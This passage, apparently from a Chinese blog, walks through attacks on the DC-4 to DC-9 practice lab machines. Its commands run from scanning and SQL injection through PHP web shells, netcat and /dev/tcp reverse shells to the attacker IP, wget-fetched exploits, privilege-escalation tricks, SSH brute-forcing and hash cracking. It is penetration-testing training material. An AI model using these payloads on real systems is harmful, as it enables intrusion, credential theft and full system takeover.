cat /root/the-flag.txt
```

成功通关！

---

# **DC-4靶机**

## SYN扫描

**SYN扫描**（半开扫描）只发送SYN包，收到SYN+ACK响应后立即发送RST终止连接，不完成三次握手，因此不会在目标系统留下连接日志，隐蔽性高且速度快。

```
// 先主机发现
nmap -sP 192.168.234.0/24 

// 得到靶机地址
192.168.234.133
```

然后使用SYN隐蔽扫描指纹信息

```
nmap -sSV 192.168.234.133 -T5 -p-
```

![](C:/Users/Administrator/myBlog/source/image/ISW-40.png)

目录扫描

```
dirb http://192.168.234.133/
```

![](C:/Users/Administrator/myBlog/source/image/ISW-41.png)

访问80端口

发现是一个登录界面，尝试万能密码

```
admin' or 1=1 --+
12345
```

拦截之后再Repeater中发包看响应

302跳转了

![](C:/Users/Administrator/myBlog/source/image/ISW-42.png)

弱口令爆破出密码为happy

点击Command随机选择一个选项，并抓包，修改payload，cat /etc/passwd，能够正常执行

那么直接nc连接

```
// 攻击机
nc -lvvp 1234

// 靶机
nc 192.168.234.128 1234 -e /bin/bash
```

![](C:/Users/Administrator/myBlog/source/image/ISW-43.png)

创建交互式终端

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 信息收集

SUID文件，有俩个可以利用，sudo和exim4命令提权

```
find / -perm -4000 -print 2>/dev/null
```

![](C:/Users/Administrator/myBlog/source/image/ISW-44.png)

查看exim4版本信息，4.89 #2版本

```
exim --version

#
4.89 #2
```

```
/etc/os-release 操作系统

cat /etc/os-release

#
www-data@dc-4:/usr/share/nginx/html$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

`/etc/passwd`权限

```
cat /etc/passwd
```

`/etc/shells`查看可用的shell

```
cat /etc/shells
```

内核版本信息

```
uname -r
```

获取所有版本信息

```
uname -a

#
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux
```

## **EXP利用**

找了一些信息，那么就可以开始分析了，先找`exim 4`漏洞，待会使用msf进行漏洞利用

```
searchsploit exim 4
```

![](C:/Users/Administrator/myBlog/source/image/ISW-45.png)

选择这个4.87 - 4.91的提权漏洞

切换到exp位置，并使用py开启http服务

```
searchsploit -p 46996.sh
```

![](C:/Users/Administrator/myBlog/source/image/ISW-46.png)

从攻击机器下载文件，**并赋予执行权限**

```
// 注意要先切到有写入文件权限的目录，一般都是/tmp
cd /tmp

// 下载文件
wget http://192.168.234.128:8888/46996.sh

// 赋予执行权限
chmod +x 46996.sh

// 执行
./46996.sh
```

![](C:/Users/Administrator/myBlog/source/image/ISW-47.png)

```
cat /root/flag.txt
```

利用成功

---

## **MSF**

```
msfconsole
search exim
```

从图中可以看到，该版本制造在2018年的2月10日

![](C:/Users/Administrator/myBlog/source/image/ISW-48.png)

```
use 1

// 显示配置项
show options
```

显示它的配置项，他需要一个session会话

![](C:/Users/Administrator/myBlog/source/image/ISW-49.png)

## exploit/multi/handler

// exploit/multi/handler 是 Metasploit 中用于接收反弹连接的通用监听模块。

```
use exploit/multi/handler


options

set lhost 192.168.234.128
set payload linux/x86/shell_reverse_tcp

run
```

然后在靶机上

```
nc 192.168.234.128 4444 -e /bin/sh
```

反弹成功![](C:/Users/Administrator/myBlog/source/image/ISW-50.png)

结束掉这个会话，重新反弹，使用run -j 将会话保存到后台，这样就能获得会话sessions了

```
结束会话按ctrl+z

或者：sessions -k 1
```

```
run -j

sessions
```

查看session的id

然后

```
use linux/local/exim4_deliver_message_priv_esc

set session 1

run
```

---

# **DC-5靶机**

## 主机发现

先主机发现

```
nmap -sP 192.168.234.0/24
或者
nmap -sP 192.168.234.0-255
```

扫到靶机192.168.234.134

---

## 全端口扫描，并使用-T参数加快速度

```
nmap -sS 192.168.234.134 -p- -T5
```

![](C:/Users/Administrator/myBlog/source/image/ISW-51.png)

打开首页

dirb目录扫描

切换到contact界面，抓包

fuzz大法，添加四个payload 攻击类型选择第二个，撞击一组payload

然后发现sql注入不存在

xss测试，也不存在

再搜集其他信息，也没看到什么

![](C:/Users/Administrator/myBlog/source/image/ISW-52.png)

再使用dirsearch 搜索，看到一个footer.php文件

![](C:/Users/Administrator/myBlog/source/image/ISW-54.png)

访问一下

再刷新一下，意外的发现了数据会变

![](C:/Users/Administrator/myBlog/source/image/ISW-53.png)

然后再看看thankyou.php

页眉也是跟footer.php一样会随机变化。

这时候就可以判断，这个表单提交成功的页面，可能存在文件包含漏洞，包含`index.php`试试

![](C:/Users/Administrator/myBlog/source/image/ISW-55.png)

包含`/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin dc:x:1000:1000:dc,,,:/home/dc:/bin/bash mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
```

这里有一个思路，就是包含nginx日志文件，在Linux系统中，Nginx的默认日志文件位置通常可以在Nginx的配置文件中找到。以下是一些关于Nginx默认日志文件位置的信息：

---

## **访问日志（Access Log）**：

**默认情况下，Nginx的访问日志通常存储在`/var/log/nginx/access.log`文件中。这个文件记录了所有访问服务器的请求信息，包括请求的时间、请求的URL、访问者的IP地址等。**

---

## **错误日志（Error Log）**：

**默认情况下，Nginx的错误日志通常存储在`/var/log/nginx/error.log`文件中。这个文件记录了Nginx服务器的错误信息，如请求出错、服务器无法响应等。**

---

## 日志文件包含getshell

这里我们先来个访问

```
http://192.168.234.134/thankyou.php?file=<?php @eval($_POST[1]);?>
```

然后包含访问日志

```
http://192.168.234.134/thankyou.php?file=/var/log/nginx/access.log
```

没有任何回显，说明文件不存在

我们再尝试一下错误日志，这里可能会有刚才的报错信息

```
http://192.168.234.134/thankyou.php?file=/var/log/nginx/error.log
```

![](C:/Users/Administrator/myBlog/source/image/ISW-56.png)

可以看到右下角有我们刚才的包含的一句话木马，但是这里无法用蚁剑连接，因为再请求前我们的一句话木马变成了url编码。

![](C:/Users/Administrator/myBlog/source/image/ISW-57.png)

所以这里要先抓包，然后把url编码解码再发送请求就能getshell了

```
http://192.168.234.134/thankyou.php?file=/var/log/nginx/error.log
```

用蚁剑连接，密码1

---

## 反弹shell

反弹shell，攻击机开启监听

```
nc -lvvp 1234
```

靶机使用nc命令

```
nc 192.168.234.128 1234 -e /bin/bash
```

开启交互式终端

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](C:/Users/Administrator/myBlog/source/image/ISW-58.png)

---

## 提权

查找SUID文件（此文件可以以文件所有者的身份**执行文件**）

```
find / -perm -4000 -print 2>/dev/null
```

看到了这个screen还有版本

```
www-data@dc-5:~/html$ find / -perm -4000 -print 2>/dev/null
find / -perm -4000 -print 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```

---

### screen

`screen` 是一个在 Unix 和类 Unix 系统上使用的终端多路复用器。

```
searchsploit screen
```

**searchsploit 检索漏洞，可以找到一个本地提权漏洞，并且有exp**

![](C:/Users/Administrator/myBlog/source/image/ISW-59.png)

先查找exp位置

```
searchsploit screen -p 41154

#
[!] Could not find EDB-ID #


  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable

```

然后切换到exp文件目录，并开启python的http服务

```
cd /usr/share/exploitdb/exploits/linux/local

python -m http.server
```

然后依次执行命令

```
cd /

ls -l
```

发现在网站目录中是没有写入权限的，需要切换到根目录，找到tmp目录，其他用户具有读写权限

```
cd /tmp

wget http://192.168.234.128:8000/41154.sh
```

### 赋予执行权限

```
chmod +x 41154.sh
```

然后执行

```
./41154.sh
```

whoami发现已经是root了，提权成功

找到root目录下的flag

```
cat /root/thisistheflag.txt
```

---

# DC-6靶机

## 主机发现、端口扫描

```
# 主机发现
nmap -sP 192.168.234.0/24

# 192.168.234.135


# 全速全端口SYN扫描指纹信息
nmap -sSV 192.168.234.135 -p- -T5
```

![](C:/Users/Administrator/myBlog/source/image/ISW-60.png)

发现网站无法访问，而且自动跳转到了一个域名

`wordy`

那么就需要添加一个host解析

```
C:\Windows\System32\drivers\etc\hosts
```

结尾添上

```
192.168.234.135 wordy
```

```
# 刷新 DNS 缓存
ipconfig /flushdns
```

这个时候就能访问了

首页没什么信息

目录扫描

```
dirb http://wordy/
```

找到后台管理界面

```
http://wordy/wp-admin/
```

---

## wordpress

![](C:/Users/Administrator/myBlog/source/image/ISW-61.png)

发现是wordpress

**WordPress 是全球最流行的开源网站内容管理系统（CMS）**，用于快速搭建网站、博客、电商平台等。

---

## WPScan

这里要用到一个工具，WPScan，一个专门为wordpress准备的信息收集工具

```
wpscan --url http://wordy/
```

![](C:/Users/Administrator/myBlog/source/image/ISW-62.png)

拿到一些信息

```
Apache/2.4.25

http://wordy/xmlrpc.php

http://wordy/readme.html
```

一个个看看

使用-e参数枚举可能的用户名，可以看到有5个可能的用户，admin，graham，mark，sarah，jens

```
wpscan --url "http://wordy/" -e
```

使用burp爆破

爆破成功

```
Username: mark, Password: helpdesk01
```

发现IP tools，可能有命令拼接

试试convert

![](C:/Users/Administrator/myBlog/source/image/ISW-63.png)

```
127.0.0.1 && nc
```

然后抓包看看，把nc改成whoami

没有用

再试试Lookup

```
127.0.0.1 & whoami
```

找到漏洞点

此时就可以反弹shell

```
nc -lvvp 1234

nc 192.168.234.128 1234 -e /bin/bash
```

开启交互式终端，并查找SUID文件

```
python -c "import pty; pty.spawn('/bin/bash')"


find / -perm -4000 -print 2>/dev/null

#
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/bin/su
/bin/mount
/bin/umount
/bin/ping
```

查看所有系统版本信息

```
uname -a
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
```

漏洞检索

```
searchsploit Debian 4.9
```

没有发现

在mark用户的目录下找到提示

```
cat /home/mark/stuff/things-to-do.txt

#
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

```
(need to speak to Jens)
Add new user: graham - GSo7isUM1D4 - done
```

## 提权

尝试切换用户

```
su graham

find / -perm -4000 -print 2>/dev/null
```

sudo可用

## sudo -l

`sudo -l` 命令的输出可能会包括以下几部分信息：

- **用户**：显示当前用户的用户名。
- **主机**：显示当前主机名，指明这些sudo权限是在哪台机器上有效的。
- **（用户）**：在括号中显示的是用户可以通过sudo切换到的其他用户，通常是root或其他管理员账户。
- **命令**：列出**用户可以执行的命令**，可能包括完整的路径、命令别名或通配符，表示一系列命令。

```
graham@dc-6:/home/jens$ sudo -l
sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

提权

```
sudo -u jens ./backups.sh
以用户 jens 的身份，执行当前目录下的 backups.sh 脚本

echo "/bin/sh" >> backups.sh

sudo -u jens ./backups.sh
```

成功切换到jens用户

再次查看

```
sudo -l

#
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

```

可以看到nmap可以用

## nmap提权

利用nmap提权

```
echo "os.execute('/bin/bash')" > /tmp/TF
sudo nmap --script=/tmp/TF
```

成功提权

```
cat /root/theflag.txt
```

---

# DC-7靶场

## 主机发现&端口扫描

```
nmap -sP 192.168.234.0/24

nmap -sSV 192.168.234.136 -p- -T5

nmap -sSV 192.168.234.136 -p- -O

-O
启用操作系统指纹识别，尝试检测目标主机的操作系统类型和版本
```

访问80端口

![](C:/Users/Administrator/myBlog/source/image/ISW-64.png)

尝试sql注入

```
123' or 1=1 --+
```

没用，目录扫描

查看robots.txt，看到有/user/login访问有一个登录页面

wappalyzer识别为Drupal

直接网上搜**@DC7USER**在github仓库中找到账号密码

```
dc7user
MdR3xOgB7#dW
```

## SSH登录

之前有nmap还扫到了22端口，ssh端口登录成功

```
ssh dc7user@192.168.234.136
```

## 提权

查找suid文件

```
find / -perm -4000 -print 2>/dev/null

#
dc7user@dc-7:~$ find / -perm -4000 -print 2>/dev/null
/bin/su
/bin/ping
/bin/umount
/bin/mount
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
You have new mail in /var/mail/dc7user
```

有俩个文件，看样子是一个计划任务

```
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1w7Xzz-0000Ll-Fa@dc-7>
Date: Tue, 31 Mar 2026 22:15:11 +1000

Database dump saved to /home/dc7user/backups/website.sql   
```

```
/opt/scripts/backups.sh

/home/dc7user/backups/website.sql   
```

先查看一下sh文件的权限

```
cd /opt/scripts/
ls -l
```

属主为root，属组为**www-data**，其他用户只有读取和执行的权限

```
dc7user@dc-7:/opt/scripts$ cat backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

查看内容发现用到了drush命令

## Drush

Drush 是一个强大的 shell 接口，可以直接从云服务器命令行管理 Drupal。

可以使用drush命令，看看用户管理方面的命令

注意：要先到网站的根目录下，才能用Drush命令

![](C:/Users/Administrator/myBlog/source/image/ISW-65.png)

尝试用drush命令添加新用户

```
先切到网站根目录
cd /var/www/html

使用drush命令创建新用户
drush user-create baixiaoyu --mail="baibai@123.com" --password="123456"
```

添加成功，然后登录

尝试修改管理员密码

```
drush user-password admin --password="123456"
```

修改源码，添加一句话木马，但是没用，因为这里只能选择html格式

![](C:/Users/Administrator/myBlog/source/image/ISW-66.png)

## 添加插件getshell

可以用这个插件，我们去安装一个插件，在这里下载

```
https://www.drupal.org/project/php/releases/8.x-1.2
```

进去之后复制下载链接，注意要是tar.gz

```
https://ftp.drupal.org/files/projects/php-8.x-1.2.tar.gz
```

找找后台添加插件的地方

在extend的list下，有install new moudle

![](C:/Users/Administrator/myBlog/source/image/ISW-67.png)

我这里下载失败了，然后换成8.x-1.0就可以了

```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

![](C:/Users/Administrator/myBlog/source/image/ISW-68.png)

选择下面的Enable newly added modules启用插件

然后筛选php这个插件点安装

![](C:/Users/Administrator/myBlog/source/image/ISW-69.png)

然后再去改首页源码，添加一句话木马

注意这里改phpcode会自动转义成html，重新写就行了

连接成功

---

## 反弹shell&计划任务提权

得到了www-data权限

反弹shell，创建一个交互式终端

```
python -c "import pty; pty.spawn('/bin/bash')"
```

---

然后我们需要向这个脚本`/opt/scripts/backups.sh`追加一行

`nc 192.168.234.128 4444 -e /bin/bash`

**原理：**

```
前几步已经得到了backups.sh脚本属主为root，属组为www-data，所以我们将反弹shell命令添加到脚本当中，等待执行脚本反弹shell即可得到root权限
```

操作：

```
cd /opt/scripts/

// 追加反弹shell命令
echo "nc 192.168.234.128 4444 -e /bin/bash" >> backups.sh

// 查看是否追加成功
cat backups.sh

然后攻击机监听
nc -lvvp 4444
```

然后就是漫长的等待

成功反弹shell

![](C:/Users/Administrator/myBlog/source/image/ISW-70.png)

```
whoami

python -c "import pty; pty.spawn('/bin/bash')"

cd /root

ls

cat theflag.txt
```

---

# DC-8靶场

## nmap主机探测&端口扫描

```
主机探测
nmap -sP 192.168.234.0/24

端口扫描
nmap 192.168.234.137
```

---

访问80端口

## sql注入

找到一个id传参

尝试sql注入

```
http://192.168.234.137/?nid=1' or 1=1 --+
```

![](C:/Users/Administrator/myBlog/source/image/ISW-71.png)

发现有报错，存在sql注入漏洞

用报错注入爆出库名`d7db`

```
http://192.168.234.137/?nid=1 and 1=updatexml(1,concat('~',(select database())),3) --+
```

![](C:/Users/Administrator/myBlog/source/image/ISW-72.png)

并且目录扫描扫到robots.txt，访问有个user/login

## sqlmap

这里先不管先去用sqlmap去爆出数据库

```
爆表
sqlmap -u http://192.168.234.137/?nid=1 -p nid -D d7db --tables

爆数据
sqlmap -u http://192.168.234.137/?nid=1 -p nid -D d7db -T users --columns

sqlmap -u http://192.168.234.137/?nid=1 -p nid -D d7db -T users -C name,pass --dump

```

## john

得到两个用户的hash密码， john 暴力破解

```
| name   | pass                                                    |
+--------+---------------------------------------------------------+
| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
```

把hash密码写入文件

然后

```
john hash
```

![](C:/Users/Administrator/myBlog/source/image/ISW-73.png)

爆出第二个用户的密码 `turtle`

登录

![](C:/Users/Administrator/myBlog/source/image/ISW-74.png)

这里有一个contact us，提交一下看看

看到了提交成功后的内容

点击这里有个Webform

找到Form settings，并修改PHP code

```
<?php echp "我的表单";?>
```

成功打印

![](C:/Users/Administrator/myBlog/source/image/ISW-75.png)

## 反弹shell

证明了可以执行php代码，那么就可以反弹shell

使用谷歌插件HackTools生成反弹shell语句

![](C:/Users/Administrator/myBlog/source/image/ISW-76.png)

```
<p>Thanks for taking the time to contact us. We shall be in contact soon.</p>
<?php echo "我的表单";

@exec("/bin/bash -i >& /dev/tcp/192.168.234.128/1234 0>&1");
?>
```

反弹失败了。

尝试nc

```
<p>Thanks for taking the time to contact us. We shall be in contact soon.</p>
<?php echo "我的表单";

@exec("nc 192.168.234.128 1234 -e /bin/bash");
?>
```

成功

创建一个交互式终端

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 提权

查找具有SUID的文件

**SUID：当一个可执行文件被设置了SUID权限后，该文件将以文件所有者的权限而不是执行者的权限来运行。（仅执行，不包括修改）**

```
find / -perm -4000 -print 2>/dev/null


这个命令的各个部分解释如下：
find /：从根目录/开始搜索。

-perm -4000：查找具有SUID权限的文件。SUID权限允许用户以文件所有者的权限执行该文件，而不是以用户自己的权限执行。这里的-4000表示设置用户ID位（SUID位）。

-print：将找到的文件路径打印到标准输出。这实际上是find命令的默认行为，所以-print可以省略。

2>/dev/null：将标准错误（文件描述符2）重定向到/dev/null。这意味着如果find命令在执行过程中遇到任何错误（比如权限不足无法访问某个目录），这些错误信息将不会被显示。
```

在Linux系统中，/sbin文件夹通常包含了一系列系统管理员使用的可执行命令，那么就可以直接利用这命令/软件，来提权

![](C:/Users/Administrator/myBlog/source/image/ISW-77.png)

查看exim版本

```
exim --versions
```

发现是4.89

## searchsploit

查找漏洞，Privilege Escalation权限提升，编号 46996.sh

```
searchsploit exim
```

搜索编号

```
searchsploit -p 46996
```

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -p 46996
  Exploit: Exim 4.87 - 4.91 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46996
     Path: /usr/share/exploitdb/exploits/linux/local/46996.sh
    Codes: CVE-2019-10149
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable                                                              
```

将这个payload文件复制到 /data下面

```
cp /usr/share/exploitdb/exploits/linux/local/46996.sh /data
```

用python开启服务器

```
cd /data
python -m http.server
```

当前文件夹没有写权限，下载不了

我们返回根目录，查看文件夹权限，发现一个其他用户具有写权限的目录

```
cd /
ls -l
```

发现tmp目录可以

```
cd /tmp

wget http://192.168.234.128:8000/46996.sh
```

下载成功，附加执行权限，默认没有执行权限的

```
chmod +x 46996.sh
```

查看这个`46996.sh`文件提示，包含了使用过程

```
执行提权脚本
./46996.sh -m netcat
```

提权成功

```
cd /root
cat /flag.txt
```

---

# **DC-9靶机**

## 主机探测

```
nmap -sP 192.168.234.0/24

nmap -sSV 192.168.234.138 -p- -T5
```

发现80端口

随便点点有个搜索框

## sql注入

存在sql注入

```
1'or 1=1#
```

![](C:/Users/Administrator/myBlog/source/image/ISW-78.png)

复制请求包，到一个文件里面，使用sqlmap跑，因为这是post请求

```
POST /results.php HTTP/1.1
Host: 192.168.234.138
Content-Length: 22
Cache-Control: max-age=0
Origin: http://192.168.234.138
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.234.138/search.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: keep-alive

search=1'or 1=1#
```

保存到post.txt中

## sqlmap

然后

```
sqlmap -r post.txt
```

后续命令

```
sqlmap -r post.txt --dbs --batch

sqlmap -r post.txt -D users --tables --batch

sqlmap -r post.txt -D users -T UserDetails --columns --batch

sqlmap -r post.txt -D users -T UserDetails -C username,password --batch -dump
```

这里我傻了，最后发现admin在staff库里，不在users

直接这样就能看到admin

```
sqlmap -r post.txt -dbs --batch --dump
```

```
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```

```
# 步骤1：先导出数据（不加 --crack）
sqlmap -r post.txt -D Staff -T Users --dump --batch

# 步骤2：单独使用 --crack 破解导出的哈希
sqlmap --crack hash
```

没想到sqlmap能破解，hashcat不行

![](C:/Users/Administrator/myBlog/source/image/ISW-79.png)

登录

```
admin
transorbital1
```

/admin/transorbital1

我们并不知道网站的绝对路径在哪，这里使用默认的试试

```
sqlmap -r post.txt --os-shell
```

`--os-shell` 是 SQLMap 的高级功能，用于尝试获取操作系统的命令行 shell。这需要数据库有足够的权限（如 DBA 权限）且满足特定条件。

os-shell获取失败，看样子mysql不允许向外部写入文件

`http://192.168.234.138/manage.php`网页这里提示了一个文件不存在，那么我们就猜测这里可能有一个get请求的file参数没有传

普通文件包含

```
/manage.php?file=/etc/passwd
```

没反应，猜测源码是路径拼接的

```
/manage.php?file=../../../../etc/passwd
```

![](C:/Users/Administrator/myBlog/source/image/ISW-80.png)

## SSH爆破-hydra

基本上所有的注入点都没了，还剩下之前那个users库里的表

![](C:/Users/Administrator/myBlog/source/image/ISW-81.png)

```
vim user.txt
vim pass.txt

hydra -L user.txt -P pass.txt -vV -t 5 192.168.234.138 ssh
```

ssh也不行了，服务被禁用了

### 端口敲门 (knockd服务) 绕过技术

```
如果存在knockd服务。
该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来"敲门"，使系统开启需要访问的服务端口，才能对外访问。
不使用时，再使用自定义的序列号来"关门"，将端口关闭，不对外监听。进一步提升了服务和系统的安全

//配置文件路径
默认配置文件是：/etc/knockd.conf
```

![](C:/Users/Administrator/myBlog/source/image/ISW-82.png)

```
//自定义端口后，依次对其进行敲门，然后就可以开启ssh服务进行连接了
//命令如下：
nmap 192.168.234.138 -p 7469
nmap 192.168.234.138 -p 8475
nmap 192.168.234.138 -p 9842
//执行完成过后，重新扫描22端口，即可发现ssh服务已经开启，可以访问
```

然后再看ssh22端口已经开启

![](C:/Users/Administrator/myBlog/source/image/ISW-83.png)

这个时候再去爆破ssh连接即可

```
hydra -L user.txt -P pass.txt -vV -t 5 192.168.234.138 ssh
```

![](C:/Users/Administrator/myBlog/source/image/ISW-84.png)

爆破出来三个

```
[22][ssh] host: 192.168.234.138   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.234.138   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.234.138   login: janitor   password: Ilovepeepee
```

先试一个

```
ssh chandlerb@192.168.234.138
```

进去先查看suid

```
find / -perm -4000 -print 2>/dev/null

ls -/ /etc/passwd
sudo -l
```

![](C:/Users/Administrator/myBlog/source/image/ISW-85.png)

joeyt

```
ssh joeyt@192.168.234.138
```

sudo也没东西

janitor

```
ssh janitor@192.168.234.138
```

## 隐藏文件的查看

第一个和第二个用户没有找到什么

找到第三个用户janitor，下面有一个隐藏文件，貌似是一个密码记录

```
cd /home/janitor
ls -a
```

找到一个文件`.secrets-for-putin`

```
cat .secrets-for-putin/
发现是一个文件夹
cd .secrets-for-putin

ls
```

发现`passwords-found-on-post-it-notes.txt`

```
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

添加到刚刚ssh的爆破字典，多了一个新用户

```
[22][ssh] host: 192.168.234.138   login: fredf   password: B4-Tru3-001
```

ssh连接

```
ssh fredf@192.168.234.138
```

查看能使用sudo执行的root文件

```
sudo -l
```

```
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

执行的时候，提示我们有一个 py 文件

```
cd /opt/devstuff/dist/test/
./test


#
fredf@dc-9:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append
```

查看test.py源码

```
cd ..
cd ..

fredf@dc-9:/opt/devstuff$ ls
build  dist  __pycache__  test.py  test.spec

cat test.py
```

test.py

```
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
    
    //将第一个文件参数读取到的内容，写入到第二个参数文件
```

## openssl

这样我们就可以得到一个思路，将一个文件内容（root组用户的信息）追加到 `/etc/passwd` 文件中，就能提权。此时我们使用 openssh 生成一个带盐的密码

**Salt** 是在密码哈希过程中添加的**随机数据**，用于防止彩虹表攻击和哈希碰撞。

```
openssl passwd -1 -salt 123 admin
```

- **openssl	OpenSSL 加密工具**
- **passwd	生成密码哈希的子命令**
- **-1	使用 MD5 加密算法（对应 $1$ 格式）**
- **-salt 123	指定盐值为 123**
- **admin	要加密的密码原文**

得到

```
$1$123$Ok9FhQy4YioYZeBPwQgm3/
```

查看root用户的结构信息

```
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
```

构造如下内容，写入到 `/tmp/user.tx`

```
admin:$1$123$Ok9FhQy4YioYZeBPwQgm3/:0:0:admin:/root:/bin/bash

